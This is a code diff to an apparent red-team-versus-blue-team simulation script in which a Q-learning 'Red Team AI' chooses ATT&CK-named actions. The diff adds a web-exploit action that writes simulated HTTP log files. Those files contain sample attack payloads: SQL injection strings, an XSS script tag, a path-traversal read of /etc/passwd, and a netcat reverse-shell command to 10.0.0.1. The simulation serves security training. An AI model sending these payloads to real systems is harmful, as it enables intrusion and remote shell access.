@@ -9,15 +9,18 @@ import os
 import time
 import random
 import utils
+import config
 
 # --- SYSTEM CONFIGURATION ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-# Q_TABLE_FILE removed
 THREAT_DB_FILE = os.path.join(BASE_DIR, "threat_db.json")
-TARGET_DIR = "/tmp"
+TARGET_DIR = config.TARGET_DIR
+
+# --- LOGGING ---
+logger = utils.setup_logging("RED", os.path.join(config.LOG_DIR, "red.log"))
 
 # --- AI HYPERPARAMETERS ---
-ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK", "T1036_MASQUERADE", "T1486_ENCRYPT", "T1070_CLEANUP"]
+ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK", "T1036_MASQUERADE", "T1486_ENCRYPT", "T1070_CLEANUP", "T1190_WEB_EXPLOIT"]
 ALPHA = 0.4
 ALPHA_DECAY = 0.9999
 GAMMA = 0.9
@@ -38,8 +41,8 @@ C_RESET = "\033[0m"
 
 def engage_offense():
     global EPSILON, ALPHA
-    print(f"{C_RED}[SYSTEM] Red Team AI Initialized. APT Framework: ACTIVE{C_RESET}")
-    
+    logger.info(f"{C_RED}[SYSTEM] Red Team AI Initialized. APT Framework: ACTIVE{C_RESET}")
+
     # Load Q-Table (SQLite)
     q_manager = utils.QTableManager("red", ACTIONS)
 
@@ -156,6 +159,27 @@ def engage_offense():
                         impact = 2 # Low impact but good for evasion
                 except: pass
 
+            elif action == "T1190_WEB_EXPLOIT":
+                # Web Attack: SQLi, XSS, etc.
+                # Generate "network traffic" file: http_req_{IP}_{ID}.log
+                ip = f"192.168.1.{random.randint(10, 200)}"
+                req_id = random.randint(1000, 9999)
+                fname = f"{TARGET_DIR}/http_req_{ip}_{req_id}.log"
+
+                payloads = [
+                    "GET /search?q=' OR 1=1 --", # SQLi
+                    "POST /login USER=admin&PASS=' OR '1'='1", # SQLi
+                    "GET /comment?msg=<script>alert(1)</script>", # XSS
+                    "GET /index.php?page=../../etc/passwd", # LFI
+                    "GET /api/v1/status | nc -e /bin/sh 10.0.0.1 4444" # RCE
+                ]
+
+                try:
+                    with open(fname, 'w') as f:
+                        f.write(_choice(payloads))
+                    impact = 6
+                except: pass
+
             # 4. REWARDS
             reward = 0
             if impact > 0: reward = R_IMPACT
@@ -176,7 +200,7 @@ def engage_offense():
             if impact > 0 and _random() > 0.5:
                 utils.DB.set_state("blue_alert_level", min(MAX_ALERT, current_alert + 1))
             
-            print(f"{C_RED}[RED AI] {C_RESET} 👹 State: {state_key} | Tech: {action} | Impact: {impact} | Q: {new_val:.2f}")
+            logger.info(f"{C_RED}[RED AI] {C_RESET} 👹 State: {state_key} | Tech: {action} | Impact: {impact} | Q: {new_val:.2f}")
             
             # Adaptive sleep based on impact
             activity = 1.0 if impact > 0 else 0.0
